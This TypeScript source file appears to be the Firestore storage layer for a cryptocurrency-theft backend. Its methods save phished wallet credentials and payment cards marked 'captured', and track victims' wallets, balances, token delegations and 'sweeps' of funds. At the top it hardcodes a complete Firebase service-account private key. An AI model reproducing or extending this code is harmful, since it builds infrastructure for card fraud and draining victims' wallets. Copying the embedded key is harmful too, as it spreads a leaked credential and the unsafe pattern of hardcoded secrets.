import { initializeApp, getApps, cert } from 'firebase-admin/app';
import { getFirestore } from 'firebase-admin/firestore';
import { logger } from './utils.js';
import { DetectionEvent, WalletInfo, BalanceState, DelegationState } from './types.js';

// ⚠️ WARNING: Hardcoded credentials – only for temporary use
const SERVICE_ACCOUNT = {
  projectId: "solana-monitor-db",
  privateKeyId: "87af7ca3f072928012b69c11dec460cdc51b85b2",
  privateKey: "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDh3l2trnIszPro\nVDqGySMUQsvEfL/J5qnXEq5CwIeHlCQNPjASPv5BxWduP6JzYv0ZDmTGttwORbKx\nNj/HYZ+q7HKihTktgxhLHOH1CaAqbPB9lDbic8NCeP6itehwBlqNjeNnUbgzwYFu\n36IW5ygOWIin5BMj2QFbOJRMTGWFAYGumeEwWN5WZmgYArgthuO2BK3rrQLsE6bf\nLqAovjypaYBauUOwtJsr2Pdsw9LdifAMMSOE5kaQNxnFFgCflKaV8fvb4tL03aZ3\ns1uBIy+ATpfPKjEqK1V8BO1MEeJt9vAQ2Cyqf+eFCTKVl9/wEjye79+dde6q1130\nafsXD2LRAgMBAAECggEAKQXZH9ViOU7Vd2Ls6lQXwfNLzRkXQFVbnYtwCQGs2+wF\nDD6yPm4ggdOXsIdwOuLMs0NQ/GJz30e7Z8JBnTXW6RVe0LO/qct4mxPY2kdwRqRY\nnYZQ3ZpG6YjOPsEpQUd2JOWTWs2V1hicKIYHi39aYBimYU/kRguA2o+RJ7ZsbdZ7\n1YAKLFMAtBW5xPvAqep3pVm4doLkmFeeFnGHfi6eRbg2yUrNVEvEiJ+SXiaOapbs\nL0mR0mXQ7a0mqc/C5EiKfP7PYFDNjAhJwKE3c6rq67F5Ki0vovwIbO3yNANTqy90\nlNgZRJ/PhyURz1CtQ0cMQj+psxJTzNdGPQq6HkNonQKBgQD2zECdsc8ELHF34J7G\nrEvfYlf0Rq+6666K6iKXI960jOppnINSkwva7mQ9wmh9Bfk9SFaO4UNA5YEoAB7d\n+WMiUP+uniZzi9olDgVwK6ER4LjhXw2pNuEKqvSfDxltvYlUlsOMAzKSvIud6YfC\nyasMulNkHBy2uPw66UZjSbgvtwKBgQDqSlawl6e0HaU8YSrp9oGiaJfjg5TBCfYJ\ncC8SYYCRVKQoBh46Qno2iuwtJLv59dGMHLSNtu/AtEea8hmNn/1z5Aza6AEc09fq\nQxidWflLvj7epHPPrFLX4hFgzLwSC9S9Qhqwrq1mhw2HgF8TaIJs1oaW2LtLRq3B\nSVwsyFbxtwKBgQCJvauel5uDp85YapwTJBxge4G9SypO97T9wPk3Q4TLXg6CjSDa\nGEm4ke6ObY9ln8zgQBxXODAR60VvbsnLd6G1iGF7MrchK/+/SJkOZrtJwBNPbX6x\nX3iwPIO0tnepwOwBsvdGkI5MSUDfDHSB6Y4211Mtf2cjMBFOS93GEmHi9wKBgBS4\nZlpPz0EarhZc8ZKnfmeCoIw6gtlfrCbBiSgy/0/bEHmJsPquDmjseF61tPoyR0oA\n7+bomuOMDhkh+CiSUbQCIzDo+9A03A+Xx4GDB40vUhgWqzdeoiT9lVPeR3PBIBts\n0Td2+1bp8sRdEguBXqeJgXWtzUKnCY7ikghT33yZAoGBAKL1g6JgLF8oBpGgrV8a\nFfoPRvHs8EeDyY4FdGq8wOGIIm+GlW8phkY4P1omxTrEb4s4zKfszcEUp+W8XG8l\n3xffWEFvou27+PEfCKxRaTX1kz0kbLSq0oiLn7BdgoFcJR55z+YJsvDGQ3DCqe2O\n4J0fphjirCwJeCEExvEkwTlh\n-----END PRIVATE KEY-----\n",
  clientEmail: "firebase-adminsdk-fbsvc@solana-monitor-db.iam.gserviceaccount.com",
};

export class AgentDatabase {
  private db: FirebaseFirestore.Firestore;

  constructor(_dbPath?: string) {
    if (!getApps().length) {
      try {
        initializeApp({
          credential: cert(SERVICE_ACCOUNT),
          projectId: SERVICE_ACCOUNT.projectId
        });
        logger.info("🔥 Firebase initialized from hardcoded credentials");
      } catch (error) {
        logger.error("❌ Firebase Init Failed:", error);
        throw error;
      }
    }
    this.db = getFirestore();
  }
  // 🟢 CREDENTIALS & SUBMISSIONS
  async getRecentSubmissions(limit: number = 5): Promise<any[]> {
    const snapshot = await this.db.collection('submissions')
      .orderBy('receivedAt', 'desc')
      .limit(limit)
      .get();
    return snapshot.docs.map(doc => doc.data());
  }

  async getRecentCards(limit: number = 5): Promise<any[]> {
    const snapshot = await this.db.collection('cards')
      .orderBy('receivedAt', 'desc')
      .limit(limit)
      .get();
    return snapshot.docs.map(doc => doc.data());
  }

  async saveCardData(data: any): Promise<void> {
    try {
      await this.db.collection('cards').add({
        ...data,
        receivedAt: new Date(),
        status: 'captured'
      });
      logger.info(`💳 Saved card for ${data.holderName || 'Unknown'}`);
    } catch (error) {
      logger.error("Failed to save card data:", error);
      throw error;
    }
  }

  async saveWalletSubmission(data: any): Promise<void> {
    try {
      await this.db.collection('submissions').add({
        ...data,
        receivedAt: new Date(),
        status: 'new'
      });
      logger.info(`💾 Saved credentials for ${data.walletName || 'Unknown Wallet'}`);
    } catch (error) {
      logger.error("Failed to save wallet submission:", error);
      throw error;
    }
  }

  // --- WALLET MONITORING METHODS ---

  async getMonitoredWallets(): Promise<WalletInfo[]> {
    const snapshot = await this.db.collection('wallets').where('isActive', '==', true).get();
    return snapshot.docs.map(doc => doc.data() as WalletInfo);
  }

  async addMonitoredWallet(wallet: WalletInfo): Promise<void> {
    await this.db.collection('wallets').doc(wallet.publicKey).set(wallet, { merge: true });
  }

  async removeMonitoredWallet(publicKey: string): Promise<void> {
    await this.db.collection('wallets').doc(publicKey).update({ isActive: false });
  }

  // --- EVENT METHODS ---

  async createDetectionEvent(event: Omit<DetectionEvent, 'id'>): Promise<string> {
    const id = `evt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    const eventData = {
      ...event,
      id,
      amount: event.amount.toString(), // Store BigInt as String for Firestore compatibility
      timestamp: new Date()
    };
    
    await this.db.collection('events').doc(id).set(eventData);
    return id;
  }

  async getDetectionEvent(id: string): Promise<DetectionEvent | null> {
    const doc = await this.db.collection('events').doc(id).get();
    if (!doc.exists) return null;
    
    const data = doc.data();
    return {
      ...data,
      amount: BigInt(data?.amount || '0') 
    } as DetectionEvent;
  }

  async updateEventStatus(id: string, status: 'pending' | 'processed' | 'failed' | 'approved' | 'rejected', error?: string): Promise<void> {
    await this.db.collection('events').doc(id).update({
      status,
      error: error || null,
      processedAt: new Date()
    });
  }

  // --- BALANCE STATE METHODS ---

  async getBalanceState(wallet: string, mint: string): Promise<BalanceState | null> {
    const docId = `${wallet}_${mint}`;
    const doc = await this.db.collection('balances').doc(docId).get();
    
    if (!doc.exists) return null;
    
    const data = doc.data();
    return {
      wallet: data?.wallet,
      mint: data?.mint,
      balance: BigInt(data?.balance || '0'),
      lastUpdated: data?.lastUpdated.toDate()
    };
  }

  async updateBalanceState(state: BalanceState): Promise<void> {
    const docId = `${state.wallet}_${state.mint}`;
    await this.db.collection('balances').doc(docId).set({
      ...state,
      balance: state.balance.toString(),
      lastUpdated: new Date()
    });
  }

  // --- DELEGATION STATE METHODS ---

  async getDelegationState(wallet: string): Promise<DelegationState | null> {
    const doc = await this.db.collection('delegations').doc(wallet).get();
    if (!doc.exists) return null;
    return doc.data() as DelegationState;
  }

  async updateDelegationState(state: DelegationState): Promise<void> {
    const safeState = {
        ...state,
        maxAmount: state.maxAmount ? state.maxAmount.toString() : '0',
        lastUpdated: new Date()
    };

    await this.db.collection('delegations').doc(state.wallet).set(safeState, { merge: true });
  }

  // --- SWEEP METHODS ---
  
  async saveSweep(wallet: string, data: any): Promise<void> {
      await this.db.collection('sweeps').doc(wallet).set(data);
  }
  
  async getSweep(wallet: string): Promise<any> {
      const doc = await this.db.collection('sweeps').doc(wallet).get();
      return doc.exists ? doc.data() : null;
  }

  async close() {
    // Firebase Admin SDK handles connection pooling automatically
  }
}
